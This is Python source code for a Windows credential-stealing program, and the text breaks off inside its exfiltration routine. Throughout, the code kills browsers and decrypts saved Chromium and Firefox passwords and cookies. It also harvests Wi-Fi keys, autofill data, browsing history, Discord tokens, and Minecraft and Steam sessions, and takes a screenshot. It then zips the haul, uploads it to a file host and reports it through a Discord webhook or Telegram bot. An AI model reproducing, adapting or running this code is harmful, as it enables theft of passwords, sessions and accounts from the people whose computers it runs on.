import os
import ctypes
import platform
import re
import time
import base64
import threading
import sqlite3
import zipfile
import win32crypt
import psutil
import shutil
import json
import requests
import subprocess
import random
import string
import conf.config as config
from Crypto.Cipher import AES
from PIL import ImageGrab
from datetime import datetime

def write(file, content):
    with open(file, 'a', encoding='utf-8') as f:
        f.write(content)
username = subprocess.run(["cmd", "/c", "whoami"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.split('\\')[1].replace('\n', '')

pcname = subprocess.run(["cmd", "/c", "whoami"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.split('\\')[0].replace('\n', '')

hwid = subprocess.check_output("powershell (Get-CimInstance Win32_ComputerSystemProduct).UUID", creationflags=subprocess.CREATE_NO_WINDOW).decode().strip()

#print(repr(username))

def zip_folder(folder_path, zip_name):
    with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                full_path = os.path.join(root, file)
                annall = os.path.relpath(full_path, folder_path)
                zipf.write(full_path, annall)

def removefile(file):
    try:
        os.remove(file)
    except:
        pass

def removedir(dir_):
    try:
        shutil.rmtree(dir_)
    except:
        pass
        
def load_nss(profile_path, nss3):
    if os.path.exists(nss3):
        nss = ctypes.CDLL(nss3)
        if nss.NSS_Init(profile_path.encode('utf-8')) == 0:
            return nss

def kill():
    exes = ['msedge.exe', 'chromium.exe', 'iron.exe', 'iridium.exe', 'vivaldi.exe', 'chrome.exe', 'mullvadbrowser.exe' 'amigo.exe', 'epic.exe', 'comet.exe', 'escosiabrowser.exe', 'duckduckgo.exe', 'dragon.exe', 'brave.exe', 'opera.exe', 'firefox.exe', 'hola.exe', 'AVGBrowser.exe', 'hola-browser.exe', 'waterfox.exe', 'seamonkey.exe', 'AvastBrowser.exe', 'browser.exe']

    for exe in exes:
        subprocess.run(["taskkill", "/F", "/IM", exe], text=True, creationflags=subprocess.CREATE_NO_WINDOW)

def decrypt_firefox_password(nss, encrypted_str):
    class SECItem(ctypes.Structure):
        _fields_ = [('type', ctypes.c_uint), ('data', ctypes.POINTER(ctypes.c_ubyte)), ('len', ctypes.c_uint)]

    decoded = base64.b64decode(encrypted_str)
    inp = SECItem(0, ctypes.cast(ctypes.create_string_buffer(decoded), ctypes.POINTER(ctypes.c_ubyte)), len(decoded))
    out = SECItem()
    if nss.PK11SDR_Decrypt(ctypes.byref(inp), ctypes.byref(out), None) == 0:
        result = ctypes.string_at(out.data, out.len).decode()
        return result


def randstr(length: int):
    characters = string.ascii_letters + string.digits
    rndmstr = ''.join(random.choice(characters) for i in range(length))
    return rndmstr

cookie_count: int = 0
password_count: int = 0
autofill_count: int = 0
browsing_history: int = 0
discord_accounts: int = 0
minecraft_sessions: int = 0
gd_session: int = 0
steam_session = 0
ss_success = 0

def get_master_key(local_state_path):
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        #print(f"[-] Master key fail: {e}")
        return None

def decrypt_password(buff: bytes, key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass

localappdata = os.getenv('localappdata')
appdata = os.getenv('appdata')

output = os.path.join(localappdata, 'Temp', 'KIRK_{}'.format(username))

zip_ = os.path.join(os.getenv('temp'), os.path.basename(output) + '.zip')
os.makedirs(output, exist_ok=True)

ver = platform.version().split('.')[2] 
plat = platform.system() + " " + '10' if int(ver) < 22000 else platform.system() + " " + '11'

def getwifipassword(network):
    wifiinfo = subprocess.run(["netsh", "wlan", "show", "profile", f"name=\"{network}\"", "key=clear"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.splitlines()
    
    for line in wifiinfo:
        if 'Key Content' in line:
            wifipsw = line.split(':')[1][1:]
            return wifipsw

def getwifiprofiles():
    wifi_profiles = []
    wifi_P = []
    WProfiles = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.splitlines()
    
    for wifiprof in WProfiles:
        if 'All User Profile' in wifiprof:
            wifipf = wifiprof.split(':')[1][1:]
            wifi_P.append(wifipf)
    for wifiprofile in wifi_P:
        wifipassword = getwifipassword(wifiprofile)
        wifi_profiles.append([wifiprofile, wifipassword])
    
    return wifi_profiles
    

wifilist = getwifiprofiles()
wifiprofiles: int = len(wifilist)
    
def systeminfo():
    syst_ = os.path.join(output, 'System')
    os.makedirs(syst_, exist_ok=True)
    sysinfooutput = os.path.join(syst_, 'System.txt')
    ipoutput = os.path.join(syst_, 'IP Info.txt')
    ram = psutil.virtual_memory()
    information = subprocess.run('systeminfo', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().replace('\r\n', '\n')
    ip_info = requests.get(base64.b64decode('aHR0cHM6Ly9pcGluZm8uaW8vanNvbg==').decode('utf-8'))
    sys_lines = []
    ip_lines = []
    if ip_info.status_code in [200, 201, 204]:
        ipinf = ip_info.json()
        ip_lines.append(f'IP ADDRESS: {ipinf.get("ip", "None")}')
        ip_lines.append(f'HOSTNAME: {ipinf.get("hostname", "None")}')
        ip_lines.append(f'LOCATION: {ipinf.get("city", "None")}, {ipinf.get("region", "None")}, {ipinf.get("country", "None")}')
        ip_lines.append(f'COORDINATES: {ipinf.get("loc", "None")}')
        ip_lines.append(f'POSTAL: {ipinf.get("postal", "None")}')
        ip_lines.append(f'ORGANIZATION: {ipinf.get("org", "None")}')
        ip_lines.append(f'TIMEZONE: {ipinf.get("timezone", "None")}')
        
    sys_lines.append(information)
    sys_lines.append('=======================================')
    sys_lines.append(f'HWID: {hwid}')
    sys_lines.append('=======================================')
    wifiprofiles = len(wifilist)
    if wifiprofiles != 0:
        sys_lines.append('\nWIFI:')
        for network, password in wifilist:
            sys_lines.append(f'{network}: {password}')
        write(sysinfooutput, '\n'.join(sys_lines))
        write(ipoutput, '\n'.join(ip_lines))

def screenshot():
    syst_ = os.path.join(output, 'System')
    os.makedirs(syst_, exist_ok=True)
    try:
        screenshot = ImageGrab.grab().save(f"{os.path.join(syst_, 'Screenshot.png')}")
        global ss_success
        ss_success = 1
    except:
        ss_success = 0
    



def stealchromium():
    global cookie_count
    global password_count
    global browsing_history
    global autofill_count

    chromium_paths = {
        'Chrome': {'path': localappdata + '\\Google\\Chrome\\User Data', 'localstate': localappdata + '\\Google\\Chrome\\User Data\\Local State'},
        'Chrome SxS': {'path': localappdata + '\\Google\\Chrome SxS\\User Data', 'localstate': localappdata + '\\Google\\Chrome SxS\\User Data\\Local State'},
        'Chrome Dev': {'path': localappdata + '\\Google\\Chrome Dev\\User Data', 'localstate': localappdata + '\\Google\\Chrome Dev\\User Data\\Local State'},
        'Chrome Beta': {'path': localappdata + '\\Google\\Chrome Beta\\User Data', 'localstate': localappdata + '\\Google\\Chrome Beta\\User Data\\Local State'},
        'AVG': {'path': localappdata + '\\AVG\\Browser\\User Data', 'localstate': localappdata + '\\AVG\\Browser\\User Data\\Local State'},
        'Chromium': {'path': localappdata + '\\Chromium\\User Data', 'localstate': localappdata + '\\Chromium\\User Data\\Local State'},
        'Amigo': {'path': localappdata + '\\Amigo\\User Data', 'localstate': localappdata + '\\Amigo\\User Data\\Local State'},
        'Hola': {'path': localappdata + '\\Hola\\chromium_profile', 'localstate': localappdata + '\\Hola\\chromium_profile\\Local State'},
        'Supermium': {'path': localappdata + '\\Supermium\\User Data', 'localstate': localappdata + '\\Supermium\\User Data\\Local State'},
        'Iridium': {'path': localappdata + '\\Iridium\\User Data', 'localstate': localappdata + '\\Iridium\\User Data\\Local State'},
        'Escosia': {'path': localappdata + '\\EscosiaBrowser\\User Data', 'localstate': localappdata + '\\EscosiaBrowser\\User Data\\Local State'},
        'Comet': {'path': localappdata + '\\Perplexity\\Comet\\User Data', 'localstate': localappdata + '\\Perplexity\\Comet\\User Data\\Local State'},
        'Yandex': {'path': localappdata + '\\Yandex\\YandexBrowser\\User Data', 'localstate': localappdata + '\\Yandex\\YandexBrowser\\User Data\\Local State'},
        'DuckDuckGo': {'path': localappdata + '\\Packages\\DuckDuckGo.DesktopBrowser_ya2fgkz3nks94\\LocalState\\EBWebView', 'localstate': localappdata + '\\Packages\\DuckDuckGo.DesktopBrowser_ya2fgkz3nks94\\LocalState\\EBWebView\\Local State'},
        'Comodo': {'path': localappdata + '\\Comodo\\Dragon\\User Data', 'localstate': localappdata + '\\Comodo\\Dragon\\User Data\\Local State'},
        'Avast': {'path': localappdata + '\\AVAST Software\\Browser\\User Data', 'localstate': localappdata + '\\AVAST Software\\Browser\\User Data\\Local State'},
        'Epic': {'path': localappdata + '\\Epic Privacy Browser\\User Data', 'localstate': localappdata + '\\Epic Privacy Browser\\User Data\\Local State'},
        'Thorium': {'path': localappdata + '\\Thorium\\User Data', 'localstate': localappdata + '\\Thorium\\User Data\\Local State'}, 
        'Cromite': {'path': localappdata + '\\Cromite\\User Data', 'localstate': localappdata + '\\Cromite\\User Data\\Local State'},
        'Edge': {'path': localappdata + '\\Microsoft\\Edge\\User Data', 'localstate': localappdata + '\\Microsoft\\Edge\\User Data\\Local State'},
        'Edge SxS': {'path': localappdata + '\\Microsoft\\Edge SxS\\User Data', 'localstate': localappdata + '\\Microsoft\\Edge SxS\\User Data\\Local State'},
        'Edge Dev': {'path': localappdata + '\\Microsoft\\Edge Dev\\User Data', 'localstate': localappdata + '\\Microsoft\\Edge Dev\\User Data\\Local State'},
        'Brave': {'path': localappdata + '\\BraveSoftware\\Brave-Browser\\User Data', 'localstate': localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Local State'},
        'Opera': {'path': appdata + '\\Opera Software\\Opera Stable', 'localstate': appdata + '\\Opera Software\\Opera Stable\\Local State'},
        'Opera GX': {'path': appdata + '\\Opera Software\\Opera GX Stable', 'localstate': appdata + '\\Opera Software\\Opera GX Stable\\Local State'},
        'Opera Air': {'path': appdata + '\\Opera Software\\Opera Air Stable', 'localstate': appdata + '\\Opera Software\\Opera Air Stable\\Local State'},
        'Vivaldi': {'path': localappdata + '\\Vivaldi\\User Data', 'localstate': localappdata + '\\Vivaldi\\User Data\\Local State'},
        }
        
    for name, path in chromium_paths.items():
        userdata = path['path']
        local_state = path['localstate']
        profiles = []
        if not os.path.exists(userdata):
            continue
        for prffl in os.listdir(userdata):
            if prffl.lower() == 'default' or prffl.lower().startswith('profile'):
                profiles.append(prffl)
                
        master_key = get_master_key(local_state)
        
        for profile in profiles:
            os.makedirs(os.path.join(output, name, profile), exist_ok=True)
            cookieoutput = os.path.join(output, name, profile, 'Cookies.txt')
            passwordoutput = os.path.join(output, name, profile, 'Passwords.txt')
            autofilloutput = os.path.join(output, name, profile, 'Autofill.txt')
            historyoutput = os.path.join(output, name, profile, 'History.txt')
            
            profile_path = os.path.join(userdata, profile)
            #print(profile_path)
            
            cookie_path = os.path.join(profile_path, 'Network', 'Cookies')
            password_path = os.path.join(profile_path, 'Login Data')
            autofill_path = os.path.join(profile_path, 'Web Data')
            history_path = os.path.join(profile_path, 'History')
            if os.path.exists(autofill_path):
                tmpdir = os.path.join(os.getenv('temp'), randstr(12))
                shutil.copy2(autofill_path, tmpdir)
                con = sqlite3.connect(tmpdir)
                cur = con.cursor()
                cur.execute("SELECT name, value FROM autofill")
                try:
                    for autofillname, val in cur.fetchall():
                        line = f"NAME: {autofillname} \nVALUE: {val}\n---------------------------------\n"
                        write(autofilloutput, line)
                        autofill_count += 1
                except Exception as e:
                    pass
                cur.close()
                con.close()
                removefile(tmpdir)
                
            if os.path.exists(cookie_path):
               tmpdir = os.path.join(os.getenv('temp'), randstr(12))
               try:
                   shutil.copy2(cookie_path, tmpdir)
                   con = sqlite3.connect(tmpdir)
                   cur = con.cursor()
                   cur.execute("SELECT host_key, name, path, encrypted_value, is_secure FROM cookies")
                   try:
                       for host, c0name, c0path, value, c0secure in cur.fetchall():
                           line = f"{host}\tTRUE\t{c0path}\t{str(c0secure).upper()}\t{2597573456}\t{c0name}\t{decrypt_password(value, master_key)}\n"
                           write(cookieoutput, line)
                           cookie_count += 1
                   except Exception as e:
                       pass
                   cur.close()
                   con.close()
                   removefile(tmpdir)
               except:
                   pass
               
            if os.path.exists(password_path):
               tmpdir = os.path.join(os.getenv('temp'), randstr(12))
               shutil.copy2(password_path, tmpdir)
               con = sqlite3.connect(tmpdir)
               cur = con.cursor()
               cur.execute("SELECT origin_url, username_value, password_value FROM logins")
               try:
                   for host, c0name, value in cur.fetchall():
                       if c0name and value:
                           line = f"URL: {host}\nUSERNAME: {c0name}\nPASSWORD: {decrypt_password(value, master_key)}\n---------------------------------\n"
                           write(passwordoutput, line)
                           password_count += 1
               except Exception as e:
                   pass
               cur.close()
               con.close()
               removefile(tmpdir)
               
            if os.path.exists(history_path):
               tmpdir = os.path.join(os.getenv('temp'), randstr(12))
               shutil.copy2(history_path, tmpdir)
               con = sqlite3.connect(tmpdir)
               cur = con.cursor()
               cur.execute("SELECT url, title, visit_count FROM urls")
               try:
                   for w3url, w3name, w3visit in cur.fetchall():
                       line = f"Name: {w3name}\nURL: {w3url}\nVISITS: {w3visit}\n---------------------------------\n"
                       write(historyoutput, line)
                       browsing_history += 1
               except Exception as e:
                   pass
               cur.close()
               con.close()
               removefile(tmpdir)
               
def stealgecko():
    global cookie_count
    global password_count
    global browsing_history
    global autofill_count
    gecko_paths = {
        "Firefox": {"path": appdata + "\\Mozilla\\Firefox\\Profiles", "nss": "C:\\Program Files\\Mozilla Firefox\\nss3.dll"},
        "Firefox Developer Edition": {"path": appdata + "\\Mozilla\\Firefox\\Profiles", "nss": "C:\\Program Files\\Firefox Developer Edition\\nss3.dll"},
        "Waterfox": {"path": appdata + "\\Waterfox\\Profiles", "nss": "C:\\Program Files\\Waterfox\\nss3.dll"},
        "Mullvad": {"path": appdata + "\\Mullvad\\MullvadBrowser\\Profiles", "nss": localappdata + "\\Mullvad\\MullvadBrowser\\Release\\nss3.dll"}, 
        "Zen": {"path": appdata + "\\zen\\Profiles", "nss": "C:\\Program Files\\Zen Browser\\nss3.dll"}, 
        "SeaMonkey": {"path": appdata + "\\Mozilla\\SeaMonkey\\Profiles", "nss": "C:\\Program Files\\SeaMonkey\\nss3.dll"}
    }
    for name, path in gecko_paths.items():
        nss = path['nss']
        userdata = path['path']
        profiles = []
        if not os.path.exists(userdata):
            continue
        for prffl in os.listdir(userdata):
            if os.path.exists(os.path.join(userdata, prffl, 'cookies.sqlite')):
                profiles.append(prffl)
        
        for profile in profiles:
            os.makedirs(os.path.join(output, name, profile), exist_ok=True)
            cookieoutput = os.path.join(output, name, profile, 'Cookies.txt')
            passwordoutput = os.path.join(output, name, profile, 'Passwords.txt')
            autofilloutput = os.path.join(output, name, profile, 'Autofill.txt')
            historyoutput = os.path.join(output, name, profile, 'History.txt')

            profile_path = os.path.join(userdata, profile)
            cookie_path = os.path.join(profile_path, 'cookies.sqlite')
            password_path = os.path.join(profile_path, 'logins.json')
            autofill_path = os.path.join(profile_path, 'formhistory.sqlite')
            history_path = os.path.join(profile_path, 'places.sqlite')
            
            if os.path.exists(cookie_path):
               tmpdir = os.path.join(os.getenv('temp'), randstr(12))
               try:
                   shutil.copy2(cookie_path, tmpdir)
                   con = sqlite3.connect(tmpdir)
                   cur = con.cursor()
                   cur.execute("SELECT host, name, path, value, isSecure FROM moz_cookies")
                   try:
                       for host, c0name, c0path, value, c0secure in cur.fetchall():
                           line = f"{host}\tTRUE\t{c0path}\t{str(c0secure).upper()}\t{2597573456}\t{c0name}\t{value}\n"
                           write(cookieoutput, line)
                           cookie_count += 1
                   except Exception as e:
                       pass
                   cur.close()
                   con.close()
                   removefile(tmpdir)
               except:
                   pass
                   
            if os.path.exists(password_path):
               tmpdir = os.path.join(os.getenv('temp'), randstr(12))
               try:
                   shutil.copy2(password_path, tmpdir)
                   _nss3 = load_nss(profile_path, nss)
                   
                   if _nss3:
                       with open(tmpdir, 'r', encoding='utf-8') as f:
                           lgns = json.load(f).get('logins', [])
                           
                       for login in lgns:
                           host = login.get('hostname', '')
                           Cusername = decrypt_firefox_password(_nss3, login.get('encryptedUsername', ''))
                           Cpassword = decrypt_firefox_password(_nss3, login.get('encryptedPassword', ''))
                           if Cusername and Cpassword:
                               line = f"URL: {host}\nUSERNAME: {Cusername}\nPASSWORD: {Cpassword}\n---------------------------------\n"
                               write(passwordoutput, line)
                               password_count += 1
                   removefile(tmpdir)
               except Exception as e:
                   pass
            
            if os.path.exists(history_path):
                tmpdir = os.path.join(os.getenv('temp'), randstr(12))
                try:
                    shutil.copy2(history_path, tmpdir)
                    con = sqlite3.connect(tmpdir)
                    cur = con.cursor()
                    cur.execute("SELECT url, title, visit_count FROM moz_places")
                    try:
                        for w3url, w3name, w3visit in cur.fetchall():
                            line = f"Name: {w3name}\nURL: {w3url}\nVISITS: {w3visit}\n---------------------------------\n"
                            write(historyoutput, line)
                            browsing_history += 1
                    except Exception as e:
                        pass
                    cur.close()
                    con.close()
                    removefile(tmpdir)
                except Exception as e:
                   pass
                   
            if os.path.exists(autofill_path):
                tmpdir = os.path.join(os.getenv('temp'), randstr(12))
                try:
                    shutil.copy2(autofill_path, tmpdir)
                    con = sqlite3.connect(tmpdir)
                    cur = con.cursor()
                    cur.execute("SELECT fieldname, value FROM moz_formhistory")
                    try:
                        for autofillname, val in cur.fetchall():
                            line = f"NAME: {autofillname} \nVALUE: {val}\n---------------------------------\n"
                            write(autofilloutput, line)
                            autofill_count += 1
                    except Exception as e:
                        pass
                    cur.close()
                    con.close()
                    removefile(tmpdir)
                except Exception as e:
                   pass


def stealdiscord(): #stole this from my token stealer 
    tokens = set()
    
    regex1 = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"
    regex2 = r"dQw4w9WgXcQ:[^\"]*"

    roaming = os.getenv('appdata')
    local = os.getenv('localappdata')
    
    paths = {
    '0Chrome': os.path.join(local, 'Google', 'Chrome', 'User Data'),
    '0ChromeSxS': os.path.join(local, 'Google', 'Chrome SxS', 'User Data'),
    '0Comet': os.path.join(local, 'Perplexity', 'Comet', 'User Data'),
    '0ChromeBeta': os.path.join(local, 'Google', 'Chrome Beta', 'User Data'),
    '0ChromeDev': os.path.join(local, 'Google', 'Chrome Dev', 'User Data'),
    '0Amigo': os.path.join(local, 'Amigo', 'User Data'),
    '0Avast': os.path.join(local, 'AVAST Software', 'Browser', 'User Data'),
    '0Chromium': os.path.join(local, 'Chromium', 'User Data'),
    '0Cent': os.path.join(local, 'CentBrowser', 'User Data'),
    '0Comodo': os.path.join(local, 'Comodo', 'Dragon', 'User Data'),
    '0Epic': os.path.join(local, 'Epic Privacy Browser', 'User Data'),
    '0Thorium': os.path.join(local, 'Thorium', 'User Data'),
    '0Cromite': os.path.join(local, 'Cromite', 'User Data'),
    '0CocCoc': os.path.join(local, 'CocCoc', 'Browser', 'User Data'),
    '0Hola': os.path.join(roaming, 'Hola', 'chromium_profile'),
    '0Iridium': os.path.join(local, "Iridium", "User Data"),
    '0Vivaldi': os.path.join(local, 'Vivaldi', 'User Data'),
    '0Yandex': os.path.join(local, 'Yandex', 'YandexBrowser', 'User Data'),
    '0Edge': os.path.join(local, 'Microsoft', 'Edge', 'User Data'),
    '0EdgeSxS': os.path.join(local, 'Microsoft', 'Edge SxS', 'User Data'),
    '0EdgeDev': os.path.join(local, 'Microsoft', 'Edge Dev', 'User Data'),
    '0Brave': os.path.join(local, 'BraveSoftware', 'Brave-Browser', 'User Data'),
    '1Discord': os.path.join(roaming, 'discord'),
    '1DiscordPTB': os.path.join(roaming, 'discordptb'),
    '1DiscordCanary': os.path.join(roaming, 'discordcanary'),
    '1Lightcord': os.path.join(roaming, 'Lighcord'),
    '2OperaOld': os.path.join(roaming, 'Opera Software', 'Opera Stable', 'Local Storage', 'leveldb'),
    '2Operanew': os.path.join(roaming, 'Opera Software', 'Opera Stable', 'Default', 'Local Storage', 'leveldb'),
    '2OperaGXOld': os.path.join(roaming, 'Opera Software', 'Opera GX Stable', 'Local Storage', 'leveldb'),
    '2DuckDuckGo': os.path.join(local, 'Packages', 'DuckDuckGo.DesktopBrowser_ya2fgkz3nks94', 'LocalState', 'EBWebView', 'Default', 'Local Storage', 'leveldb'),
    '2OperaGXNew': os.path.join(roaming, 'Opera Software', 'Opera GX Stable', 'Default', 'Local Storage', 'leveldb'),
    '2OperaAir': os.path.join(roaming, 'Opera Software', 'Opera Air Stable', 'Default', 'Local Storage', 'leveldb'),
    '2Legcord': os.path.join(roaming, 'legcord', 'Local Storage', 'leveldb'),
    '2Vesktop': os.path.join(roaming, 'vesktop', 'sessionData', 'Local Storage', 'leveldb'),
    '3FireFox': os.path.join(roaming, 'Mozilla', 'Firefox', 'Profiles'),
    '3WaterFox': os.path.join(roaming, 'Waterfox', 'Profiles'),
    '3LibreWolf': os.path.join(roaming, 'LibreWolf', 'Profiles'),
}
    #this is doing way too much for a token stealer
    for browser, path in paths.items():
        if not os.path.exists(path):
            continue
            
        if browser.startswith('0'):
            ps = os.listdir(path)
            for prof in ps:
                if prof.lower() == 'default' or prof.lower().startswith('profile'):
                    pr_path = os.path.join(path, prof)
                    ldb = os.path.join(pr_path, 'Local Storage', 'leveldb')                    
                    tkdb = os.listdir(ldb)
                    for file in tkdb:
                        if not file.endswith('.log') and not file.endswith('.ldb'):
                            continue
                        else:
                            fn = os.path.join(ldb, file)
                            try:
                                with open(fn, errors="ignore", encoding="utf-8") as f:
                                    gnw = f.read()
                                    match = re.findall(regex1, gnw)
                                    for m in match:
                                        tokens.add(m)
                            except:
                                pass
        elif browser.startswith('1'):
            local_state = os.path.join(path, 'Local State')
            key = get_master_key(local_state)
            
            ldb = os.path.join(path, 'Local Storage', 'leveldb')
            tkdb = os.listdir(ldb)
            for file in tkdb:
                fn = os.path.join(ldb, file)
                try:
                    with open(fn, errors="ignore", encoding="utf-8") as f:
                        gnw = f.read()
                        match = re.findall(regex2, gnw)
                        if match:
                            for m in match:
                                enc = m.split('dQw4w9WgXcQ:')[1]
                                enc = base64.b64decode(enc)
                                t = decrypt_password(enc, key)
                                if not t is None:
                                   tokens.add(t)
                except:
                    pass
                            
        elif browser.startswith('2'):
            tkdb = os.listdir(path)
            for file in tkdb:
                if not file.endswith('.log') and not file.endswith('.ldb'):
                    continue
                else:
                    fn = os.path.join(path, file)
                    try:
                        with open(fn, errors="ignore", encoding="utf-8") as f:
                            gnw = f.read()
                            match = re.findall(regex1, gnw)
                            for m in match:
                                tokens.add(m)
                    except:
                        pass
        elif browser.startswith('3'):
            prof = os.listdir(path)
            for profpth in prof:
                ldb = os.path.join(path, profpth, 'storage', 'default')
                if not os.path.exists(ldb):
                    continue
                for discord in ['https+++discord.com', 'https+++canary.discord.com', 'https+++ptb.discord.com']:
                    tkdb = os.path.join(ldb, discord, 'ls', 'data.sqlite')
                    if not os.path.exists(tkdb):
                        continue
                    try:
                        with open(tkdb, errors="ignore", encoding="utf-8") as f:
                            gnw = f.read()
                            match = re.findall(regex1, gnw)
                            for m in match:
                                tokens.add(m)
                    except:
                        pass
    return tokens
    
def accountdate(id):
    de = 1420070400000
    time = ((int(id) >> 22) + de) / 1000
    date = datetime.utcfromtimestamp(time)
    return date.strftime('%Y-%m-%d %H:%M:%S') + ' ' + 'UTC Timezone' 


def verify(token):
    headers = {
    'authorization': token,
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0'
    }
    v = requests.get(base64.b64decode('aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvdjYvdXNlcnMvQG1l').decode('utf-8'), headers=headers)
    if v.status_code in [200, 201, 204]:
        return v.json()
    else:
        return False

def stealdiscordacc():
    if config.discordacc:
        global discord_accounts
        discordtokens = stealdiscord()

        d_output = os.path.join(output, 'Discord')
        discordoutput = os.path.join(output, 'Discord', 'DiscordAccounts.txt')
        os.makedirs(d_output, exist_ok=True)
        for token in discordtokens:
            headers = {
            'authorization': token,
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0'
            }
            valid = verify(token)
            if valid:
                discord_accounts += 1
                userinfo = valid
                username = userinfo.get('username', "N/A")
                email = userinfo.get('email', "N/A")
                nitro = "True" if userinfo.get("premium_type") else "False"
                user_id = userinfo.get('id')
                avatar = userinfo.get('avatar')
                phone = userinfo.get('phone', "N/A")
                bio = userinfo.get('bio') or "None"
                mfa = "True" if userinfo.get("mfa_enabled") else "False"
                locale = userinfo.get('locale')
                pfp = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar}?size=1024" if avatar else "None"

                line_ = f"""TOKEN: {token}
USER ID: {user_id}
ACCOUNT CREATED: {accountdate(user_id)}
USERNAME: {username}
EMAIL: {email}
PHONE NUMBER: {phone}
BIO: {bio}
PFP: {pfp}
MFA: {mfa}
NITRO: {nitro}
=====================================
"""
                write(discordoutput, line_)

def collectminecraft():
    if config.games:
        global minecraft_sessions
        minecraftoutput = os.path.join(output, 'Minecraft Sessions')
        userprofile = os.getenv('userprofile')
        appdata = os.getenv('appdata')
        mcpaths = {
        'Tlauncher': os.path.join(appdata, '.minecraft', 'TlauncherProfiles.json'),
        'Minecraft Launcher Old': os.path.join(appdata, '.minecraft', 'launcher_accounts.json'),
        'Minecraft Launcher': os.path.join(appdata, '.minecraft', 'launcher_accounts_microsoft_store.json'),
        'Feather': os.path.join(appdata, '.feather', 'account.txt'),
        'Lunar Client': os.path.join(userprofile, '.lunarclient', 'settings', 'game', 'accounts.json'),
        }
        for name, path in mcpaths.items():
            if os.path.exists(path):
                try:
                    os.makedirs(os.path.join(minecraftoutput, name), exist_ok=True)
                    shutil.copy2(path, os.path.join(minecraftoutput, name, os.path.basename(path)))
                    minecraft_sessions += 1
                except:
                    continue
        modrinth_files = [
            os.path.join(appdata, "ModrinthApp", "app.db"),
            os.path.join(appdata, "ModrinthApp", "app.db-shm"),
            os.path.join(appdata, "ModrinthApp", "app.db-wal")
        ]
        for file_ in modrinth_files:
            if os.path.exists(file_):
                try:
                    os.makedirs(os.path.join(minecraftoutput, 'Modrinth'), exist_ok=True)
                    shutil.copy2(file_, os.path.join(minecraftoutput, 'Modrinth', os.path.basename(file_)))
                    minecraft_sessions += 1
                except:
                    pass
            
def collectsteam():
    if config.games:
        global steam_session
        steampath = os.path.join(os.getenv('programfiles(x86)'), 'Steam')
        loginpaath = os.path.join(steampath, 'config', 'loginusers.vdf')
        steamoutput = os.path.join(output, 'Steam')
        if os.path.exists(steampath):
            try:
                os.makedirs(steamoutput, exist_ok=True)
                shutil.copy2(loginpaath, os.path.join(steamoutput, os.path.basename(loginpaath)))
                steam_session = 1
            except:
                pass

kill()
funcs = [systeminfo, screenshot, stealchromium, stealgecko, stealdiscordacc, collectminecraft, collectsteam]
# systeminfo()
# screenshot()
# kill()
# stealchromium()
# stealgecko()
# stealdiscordacc()
# collectminecraft()
# collectsteam()
         
threads = []
for fn in funcs:
    t = threading.Thread(target=fn, daemon=True)
    t.start()
    threads.append(t)

for t in threads:
    t.join()
    
zip_folder(output, zip_)


    
    
def sendtoc2(file):
    stores = ['store1', 'store2', 'store3', 'store4', 'store5']
    with open(file, 'rb') as f:
        for store in stores:
            f.seek(0)
            upload = requests.post(f'https://{store}.gofile.io/uploadFile', files={'file': f})
            if upload.status_code in [200, 201, 204]:
                uj = upload.json()
                #print(upload.text)
                #print(uj)
                #print(upload.status_code)
                download = uj['data']['downloadPage']
                break
            else:
                continue
    if config.type == "discord":
        webhookurl = config.hook
        
        payload = {
          "content": "@everyone",
          "embeds": [
            {
              "title": "GOD BLESS AMERICA",
              "description": f"```Total C00K135: {str(cookie_count)}\nTotal P455W0RDS: {str(password_count)}\nTotal AU70F1LLS: {str(autofill_count)}\nTotal History: {str(browsing_history)}\nTotal D15C0RD: {str(discord_accounts)}\nTotal Minecraft Sessions: {str(minecraft_sessions)}\nSteam Session: {'Yes' if steam_session else 'No'}\nScreenshot: {'Yes' if ss_success == 1 else 'No'}\nW1F1 N37W0RK5: {str(wifiprofiles)} \n```\n\ncreds: ||{download}||",
              "color": 3866871,
              "author": {
                "name": "KirkG"
              },
              "thumbnail": {
                "url": base64.b64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3h2aGpzMi9LaXJrZWRHcmFiYmVyL3JlZnMvaGVhZHMvbWFpbi9yZXNvdXJjZXMvdHVybmluZ3BvaW50LmpwZw==").decode('utf-8')
              }
            }
          ],
          "username": "Charlie Kirk",
          "avatar_url": base64.b64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3h2aGpzMi9LaXJrZWRHcmFiYmVyL3JlZnMvaGVhZHMvbWFpbi9yZXNvdXJjZXMvY2hhcmxpZSUyMGtpcmsuanBn").decode('utf-8')
    }
        r = requests.post(webhookurl, json=payload)
        # print(r.text)
    
    if config.type == "telegram":
        chat_id = config.tg_chat
        token = config.tg_token

        msg = f'''GOD BLESS AMERICA I AM CHARLIE KIRK
Total Cookies: {str(cookie_count)}
Total Passwords: {str(password_count)}
Total Autofills: {str(autofill_count)}
Total History: {str(browsing_history)}
Total Discord Accounts: {str(discord_accounts)}
Total Minecraft Sessions: {str(minecraft_sessions)}
